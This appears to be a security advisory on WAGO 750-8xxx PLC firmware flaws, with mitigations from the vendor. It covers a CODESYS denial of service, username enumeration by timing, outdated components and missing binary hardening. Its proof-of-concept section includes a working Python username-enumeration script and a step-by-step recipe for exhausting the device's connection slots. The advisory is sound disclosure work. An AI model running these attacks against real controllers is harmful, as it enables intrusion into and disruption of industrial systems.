Business recommendation:
------------------------
WAGO's customers should upgrade the firmware to the latest version available.

A thorough security review should be performed by security professionals to
identify further security issues.


Vulnerability overview/description:
-----------------------------------
1) Denial of Service (Codesys) (CVE-2021-34593)
The "plclinux_rt" binary is listening on port 2455. It handles communication with
the CODESYS suite. By sending requests that define an invalid packet size, a
malloc error can be triggered. This leads to a denial of service of the remote
connectivity of the codesys service.

This was also reported to and released together with CODESYS, find the
corresponding advisories here:
https://sec-consult.com/vulnerability-lab/advisory/codesys-v2-denial-of-service/
https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=16877&token=8faab0fc1e069f4edfca5d5aba8146139f67a175


2) Enumeration of Users
Due to a time-based side channel vulnerability, it can be derived which
usernames are valid. This eases the process of brute-forcing valid credentials.


3) Outdated Software with Known Vulnerabilities
The PLC is using multiple outdated software components with known exploits.


4) Insufficient Hardening of Binaries
Multiple binaries are not compiled with available security features. This will
ease further attacks once a memory corruption vulnerability has been spotted.


Proof of concept:
-----------------
1) Denial of Service (Codesys) (CVE-2021-34593)
Codesys packet headers are structured like below (pseudo code):

struct codesys_header {
		uint16_t magic,
		int32_t packet_size
}

The magic bytes will be 0xbbbb. By defining a packet size of 0xffffffff, a size
of 4 GB is defined. The following pseudo code will be used to handle the
request:

allocated_mem = (byte*)SysAllocDataMemory(coedesys_header.packet_size);
buffer_info->recv_buf_wout_header = allocated_mem;
if (allocated_mem == (byte *)0x0) {
     return;
}

As 4GB of memory aren't available, malloc will return a NULL pointer, which is
passed back through the SysAllocDataMemory() function and the return statement
in the pseudo code will be hit. Thus, the TCPServerTask() function will return.
The file descriptor for the client is not cleared in advance. Therefore, the
socket stays open indefinitely. A new client will open the next file
descriptor. As only 19 clients are allowed to be connected simultaneously, it
is sufficient to send 19 requests with a wrong packet length to force the PLC
into a state where it will refuse further connections to the Codesys service.

The current implementation is missing the call to SysSockClose() once a buffer
allocation fails.


2) Enumeration of Users
A time-based side channel vulnerability in the webserver's authentication
method is leaking information about valid usernames. The following code snippet is
used in the login method:

// get password file and iterate over every line
$pwFileArray = file($passwordFilename);
foreach($pwFileArray as $lineNo => $pwFileLine)
{
   // extract username and user password
   $passwordFileData = explode(':', trim($pwFileLine));
   // if username was found in line, verify given password with user password
   if(isset($passwordFileData[0]) && ($passwordFileData[0] === $username))
   {
     $pwCorrect = password_verify($password, $passwordFileData[1]);
     break;
   }
}

The password hash is only calculated if the username is found to be valid. As
the PLC has limited computational power, this results in different timings for
the response depending on the validity of the username. The following script
can be used to find valid users. The parameter 'delay_valid' might need to be
adjusted to the network speed:

----------------------------
#!/usr/sbin/python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

delay_valid = 0.2

f = open(sys.argv[1],"r");

for user in f.readlines():
     payload = {"username":user.replace('\n',''),"password":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}
     cnt = 0
     for i in range(5):
         try:
             r = requests.post("https://<your_PLC_IP>/wbm/php/authentication/login.php", json=payload, timeout=delay_valid, verify=False)
         except:
             cnt = cnt +1
     if cnt >=3:
         print("[*]Valid User: {}".format(user))
-----------------------------


3) Outdated Software with Known Vulnerabilities
Following outdated and vulnerable components were identified by using the IoT Inspector
firmware analysis tool:

- Dsnmasq 2.80: 9 CVEs
- Bash 4.4.23: 1 CVE
- GNU glibc 2.30: 12 CVEs
- Linux Kernel 4.9.146: 663 CVEs
- OpenSSL 1.0.1: 103 CVEs
- BusyBox 1.30.1: 2 CVEs
- Curl 7.72.0: 1 CVE
- OpenSSH 7.9p1: 4 CVEs
- PHP 7.3.15: 11 CVEs
- Wpa_supplicant 2.6: 20 CVEs
- NET-SNMP 5.8: 1 CVE
- Libpcap 1.8.1: 5 CVEs
- Info-ZIP 3.0: 13 CVEs


4) Insufficient Hardening of Binaries
The following features were extracted with the IoT Inspector:
- 1.9% of all executables support full RELRO
- 84.6% support partial RELRO
- Only 3.6% of all executables make use of stack canaries
- 58.9% are using ASLR/PIE

The plclinux_rt binary is an example of a particularly vulnerable binary. It
accepts user input on port 2455 and is missing all compile-time security
features. Thus, it's a perfect candidate to successfully exploit any identified
buffer overflow.


Vulnerable / tested versions:
-----------------------------
The following versions have been tested and found to be vulnerable:
* WAGO 750-8xxx Firmware 18 (v03.06.11)
* WAGO 750-8xxx Firmware 15 (v03.03.10)

             on their website.
2022-01-26: Release of security advisory.


Solution:
---------
Immediately update the PLCs to the fixed firmware version provided by the
vendor to mitigate CVE-2021-34593.

The fixed firmware release 20 patch 1 can be obtained from
https://www.wago.com/de/d/6599873

Regarding vulnerability 2)
As stated by Wago, there are only two possible default usernames. Therefore,
the username enumeration may not gain additional information and this will
not be changed.

Additionally, due to varying release cycles, there is a delay
in updating components (affecting the other identified vulnerabilities). It is
planned to change to a new distribution release with firmware 20.


Workaround:
-----------
None
